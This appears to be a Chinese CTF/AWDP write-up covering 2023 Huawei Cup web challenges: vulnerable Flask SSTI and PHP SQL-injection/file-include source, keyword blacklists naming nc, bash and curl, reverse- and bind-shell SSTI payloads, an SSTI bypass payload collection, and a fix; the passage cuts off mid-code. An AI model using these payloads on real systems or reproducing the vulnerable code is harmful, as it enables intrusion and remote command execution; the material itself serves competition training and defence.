+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const keywords = [<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;cat&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (const i of keywords) &#123;</span><br><span class="line">    <span class="keyword">if</span> (code.includes(i)) &#123;</span><br><span class="line">        result = <span class="string">&quot;Hacker!&quot;</span>  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        result = vm.run((code));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fix</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    ip, port = re.findall(pattern,request.host).pop()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.form.get(<span class="string">&quot;word&quot;</span>):</span><br><span class="line">        word = request.form.get(<span class="string">&quot;word&quot;</span>)</span><br><span class="line">        black_list = [<span class="string">&quot;&#123;&#123;&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> tmp <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> tmp <span class="keyword">in</span> word:</span><br><span class="line">                word = <span class="string">&quot;Hacker!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> waf(word):</span><br><span class="line">            word = <span class="string">&quot;Hacker!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        word = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(content % (<span class="built_in">str</span>(ip), <span class="built_in">str</span>(port), <span class="built_in">str</span>(word)))</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2023华为杯研究生赛awdp-web"><a href="#2023华为杯研究生赛awdp-web" class="headerlink" title="2023华为杯研究生赛awdp-web"></a>2023华为杯研究生赛awdp-web</h2><p>参考：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/17847238.html" >https://www.cnblogs.com/EddieMurphy-blogs/p/17847238.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="Constellation-query"><a href="#Constellation-query" class="headerlink" title="Constellation_query"></a>Constellation_query</h2><p>源码</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template,render_template_string</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_constellation</span>(<span class="params">month,day</span>):</span><br><span class="line">    <span class="keyword">if</span> (month == <span class="number">1</span> <span class="keyword">and</span> day &gt;= <span class="number">20</span>) <span class="keyword">or</span> (month == <span class="number">2</span> <span class="keyword">and</span> day &lt;= <span class="number">18</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;水瓶座&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> (month == <span class="number">2</span> <span class="keyword">and</span> day &gt;= <span class="number">19</span>) <span class="keyword">or</span> (month == <span class="number">3</span> <span class="keyword">and</span> day &lt;= <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;双鱼座&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> (month == <span class="number">3</span> <span class="keyword">and</span> day &gt;= <span class="number">21</span>) <span class="keyword">or</span> (month == <span class="number">4</span> <span class="keyword">and</span> day &lt;= <span class="number">19</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;白羊座&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> (month == <span class="number">4</span> <span class="keyword">and</span> day &gt;= <span class="number">20</span>) <span class="keyword">or</span> (month == <span class="number">5</span> <span class="keyword">and</span> day &lt;= <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;金牛座&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> (month == <span class="number">5</span> <span class="keyword">and</span> day &gt;= <span class="number">21</span>) <span class="keyword">or</span> (month == <span class="number">6</span> <span class="keyword">and</span> day &lt;= <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;双子座&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> (month == <span class="number">6</span> <span class="keyword">and</span> day &gt;= <span class="number">21</span>) <span class="keyword">or</span> (month == <span class="number">7</span> <span class="keyword">and</span> day &lt;= <span class="number">22</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;巨蟹座&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> (month == <span class="number">7</span> <span class="keyword">and</span> day &gt;= <span class="number">23</span>) <span class="keyword">or</span> (month == <span class="number">8</span> <span class="keyword">and</span> day &lt;= <span class="number">22</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;狮子座&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> (month == <span class="number">8</span> <span class="keyword">and</span> day &gt;= <span class="number">23</span>) <span class="keyword">or</span> (month == <span class="number">9</span> <span class="keyword">and</span> day &lt;= <span class="number">22</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;处女座&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> (month == <span class="number">9</span> <span class="keyword">and</span> day &gt;= <span class="number">23</span>) <span class="keyword">or</span> (month == <span class="number">10</span> <span class="keyword">and</span> day &lt;= <span class="number">22</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;天秤座&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> (month == <span class="number">10</span> <span class="keyword">and</span> day &gt;= <span class="number">23</span>) <span class="keyword">or</span> (month == <span class="number">11</span> <span class="keyword">and</span> day &lt;= <span class="number">21</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;天蝎座&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> (month == <span class="number">11</span> <span class="keyword">and</span> day &gt;= <span class="number">22</span>) <span class="keyword">or</span> (month == <span class="number">12</span> <span class="keyword">and</span> day &lt;= <span class="number">21</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;射手座&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> (month == <span class="number">12</span> <span class="keyword">and</span> day &gt;= <span class="number">22</span>) <span class="keyword">or</span> (month == <span class="number">1</span> <span class="keyword">and</span> day &lt;= <span class="number">19</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;摩羯座&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;无效的日期&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blacklist</span>(<span class="params">day</span>):</span><br><span class="line">    blacklists = [<span class="string">&quot;&#123;&#123;&quot;</span>,<span class="string">&quot;print&quot;</span>,<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;nc&quot;</span>,<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;curl&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> blacklists:</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> day:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            month = request.form[<span class="string">&quot;month&quot;</span>]</span><br><span class="line">            day = request.form[<span class="string">&quot;day&quot;</span>]</span><br><span class="line">            constellation = find_constellation(<span class="built_in">int</span>(month), <span class="built_in">int</span>(day))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            constellation = <span class="string">&quot;无效的日期&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        month = <span class="string">&quot;xx&quot;</span></span><br><span class="line">        day = <span class="string">&quot;xx&quot;</span></span><br><span class="line">        constellation = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;星座查询&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">        body &#123;</span></span><br><span class="line"><span class="string">            background-image: url(&quot;/static/1.jpg&quot;); /* 背景图片路径 */</span></span><br><span class="line"><span class="string">            background-size: cover;</span></span><br><span class="line"><span class="string">            background-repeat: no-repeat;</span></span><br><span class="line"><span class="string">            font-family: Arial, sans-serif;</span></span><br><span class="line"><span class="string">            text-align: center;</span></span><br><span class="line"><span class="string">            color: #fff;</span></span><br><span class="line"><span class="string">            display: flex;</span></span><br><span class="line"><span class="string">            justify-content: center;</span></span><br><span class="line"><span class="string">            align-items: center;</span></span><br><span class="line"><span class="string">            height: 100vh;</span></span><br><span class="line"><span class="string">            margin: 0;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        #container &#123;</span></span><br><span class="line"><span class="string">            background-color: rgba(0, 0, 0, 0.5);</span></span><br><span class="line"><span class="string">            padding: 20px;</span></span><br><span class="line"><span class="string">            border-radius: 10px;</span></span><br><span class="line"><span class="string">            width: 400px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        h1 &#123;</span></span><br><span class="line"><span class="string">            font-size: 24px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        form &#123;</span></span><br><span class="line"><span class="string">            display: flex;</span></span><br><span class="line"><span class="string">            flex-direction: column;</span></span><br><span class="line"><span class="string">            align-items: center;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        label &#123;</span></span><br><span class="line"><span class="string">            margin-top: 10px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        input[type=&quot;text&quot;] &#123;</span></span><br><span class="line"><span class="string">            width: 100px; /* 调整输入框的宽度 */</span></span><br><span class="line"><span class="string">            padding: 5px;</span></span><br><span class="line"><span class="string">            border: 1px solid #ccc;</span></span><br><span class="line"><span class="string">            border-radius: 5px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        input[type=&quot;submit&quot;] &#123;</span></span><br><span class="line"><span class="string">            margin-top: 10px;</span></span><br><span class="line"><span class="string">            padding: 10px 20px;</span></span><br><span class="line"><span class="string">            background-color: #007bff;</span></span><br><span class="line"><span class="string">            color: #fff;</span></span><br><span class="line"><span class="string">            border: none;</span></span><br><span class="line"><span class="string">            border-radius: 5px;</span></span><br><span class="line"><span class="string">            cursor: pointer;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div id=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;星座查询&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;month&quot;&gt;请输入出生月份：&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;month&quot; name=&quot;month&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;day&quot;&gt;请输入出生日期：&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;day&quot; name=&quot;day&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;查询&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;%s月%s日出生 查询结果为%s&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    dayargs = blacklist(day)</span><br><span class="line">    <span class="keyword">if</span> dayargs == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;检测到危险关键词，已被WAF拦截！&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(html % (<span class="built_in">int</span>(month),day,constellation))</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        month = <span class="number">0</span></span><br><span class="line">        day = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(html % (month, day, constellation))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>漏洞点在<code>render_template_string(html % (int(month),day,constellation))</code>处，day字段可控，存在<strong>SSTI</strong></p>
+<p>存在WAF</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">存在WAF：&quot;&#123;&#123;&quot;,&quot;print&quot;,&quot;cat&quot;,&quot;flag&quot;,&quot;nc&quot;,&quot;bash&quot;,&quot;sh&quot;,&quot;curl&quot;</span><br><span class="line"></span><br><span class="line">&#123;%	绕过	&#123;&#123;</span><br><span class="line">过滤print，反弹shell绕过无回显</span><br><span class="line">bash 利用字符串拼接绕过 &quot;bas&quot;+&quot;h&quot;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>payload</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">反弹shell</span><br><span class="line">&#123;% if request[&quot;applica&quot;+&quot;tion&quot;].__globals__.__builtins__.__import__(&quot;os&quot;).system(&quot;bas&quot;+&quot;h -i &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1&quot;) %&#125;123&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">正向连shell</span><br><span class="line">&#123;% if request[&quot;applica&quot;+&quot;tion&quot;].__globals__.__builtins__.__import__(&quot;os&quot;).system&quot;n&quot;+&quot;c&quot;+&quot; -e /bin/bas&quot;+&quot;h 靶机ip 12123&quot;) %&#125;123&#123;% endif %&#125;</span><br><span class="line">攻击机链接：nc 靶机ip 12123</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>删除<code>render_template_string函数</code>，</p>
+<p>将<code>render_template_string(html % (int(month),day,constellation))</code>修改为<code>html % (int(month),day,constellation)</code>即可</p>
+<h3 id="SSTI-特殊payload汇总"><a href="#SSTI-特殊payload汇总" class="headerlink" title="SSTI 特殊payload汇总"></a>SSTI 特殊payload汇总</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">当存在过滤且长度限制较短时，可利用 config 全局对象分段保存 Payload：</span><br><span class="line">&#123;%<span class="built_in">set</span> x=config.update(l=lipsum)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> x=config.update(g=request.args.a)%&#125;&amp;a=__globals__</span><br><span class="line">&#123;%<span class="built_in">set</span> x=config.update(f=config.l|attr(config.g))%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> x=config.update(o=config.f.os)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> x=config.update(p=config.o.popen)%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(config.p(request.args.c).read())%&#125;&amp;c=whoami</span><br><span class="line"></span><br><span class="line">当遇到 SSTI 长度限制时，在没有过滤且限制长度较大时可以优先尝试使用较短的 Payload：</span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">传参绕过</span><br><span class="line">?name=&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()[<span class="number">128</span>]|attr(request.args.x4)|attr(request.args.x5)[request.args.x6](<span class="string">&#x27;ls&#x27;</span>).[request.args.x7]()&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__init__&amp;x5=__globals__&amp;x6=popen&amp;x7=read</span><br><span class="line"></span><br><span class="line">工具</span><br><span class="line">fenjing webui</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="include-shell"><a href="#include-shell" class="headerlink" title="include_shell"></a>include_shell</h2><p>login.php</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">&#x27;admin/databases.php&#x27;</span>);</span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">// 定义SQL注入关键字的黑名单</span><br><span class="line">$blacklist = array(</span><br><span class="line">    <span class="string">&quot;SELECT&quot;</span>, <span class="string">&quot;INSERT&quot;</span>, <span class="string">&quot;UPDATE&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;OR&quot;</span>, <span class="string">&quot;AND&quot;</span>, </span><br><span class="line">    <span class="string">&quot;UNION&quot;</span>, <span class="string">&quot;ALL&quot;</span>, <span class="string">&quot;DROP&quot;</span>, <span class="string">&quot;FROM&quot;</span>, <span class="string">&quot;TABLE&quot;</span>, <span class="string">&quot;BASE&quot;</span>, <span class="string">&quot;INFO&quot;</span>, <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">);</span><br><span class="line">// 检查用户输入是否匹配黑名单关键字</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/(&quot;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $blacklist) . <span class="string">&quot;)/i&quot;</span>, $username) </span><br><span class="line">    || preg_match(<span class="string">&quot;/(&quot;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $blacklist) . <span class="string">&quot;)/i&quot;</span>, $password)</span><br><span class="line">) &#123;</span><br><span class="line">    // 如果用户名或密码包含黑名单关键字，替换黑名单关键字为空</span><br><span class="line">    $username = str_replace($blacklist, <span class="string">&quot;&quot;</span>, $username);</span><br><span class="line">    $password = str_replace($blacklist, <span class="string">&quot;&quot;</span>, $password);</span><br><span class="line">    $sql = <span class="string">&quot;SELECT * FROM user WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;&quot;</span>;</span><br><span class="line">    echo $sql;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $sql = <span class="string">&quot;SELECT * FROM user WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = mysqli_query($link, $sql);</span><br><span class="line">$num = mysqli_num_rows($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($username === <span class="string">&quot;admin&quot;</span> &amp;&amp; $num) &#123;</span><br><span class="line">    session_start();</span><br><span class="line">    // 在验证用户后，如果登录成功，设置会话变量来表示用户已登录</span><br><span class="line">    $_SESSION[<span class="string">&#x27;loggedin&#x27;</span>] = true;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>; // 用户名</span><br><span class="line">    $_SESSSION[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>; // 用户角色或权限（注：此处原代码存在拼写错误，应为 $_SESSION）</span><br><span class="line">    echo <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./admin/admin.html&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>load_page.php</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 开始会话</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">// 检查用户是否已登录</span><br><span class="line"><span class="keyword">if</span> (!isset($_SESSION[<span class="string">&#x27;loggedin&#x27;</span>]) || $_SESSION[<span class="string">&#x27;loggedin&#x27;</span>] !== true) &#123;</span><br><span class="line">    // 用户未登录，可以跳转到登录页面或执行其他操作</span><br><span class="line">    header(<span class="string">&#x27;Location: ../login.html&#x27;</span>);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 检查用户的权限</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;role&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    // 用户没有足够的权限执行该操作，可以显示错误消息或执行其他操作</span><br><span class="line">    echo <span class="string">&quot;您没有足够的权限执行该操作。&quot;</span>;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 如果用户已登录并具有所需的权限，可以执行受保护的操作</span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    include($page);		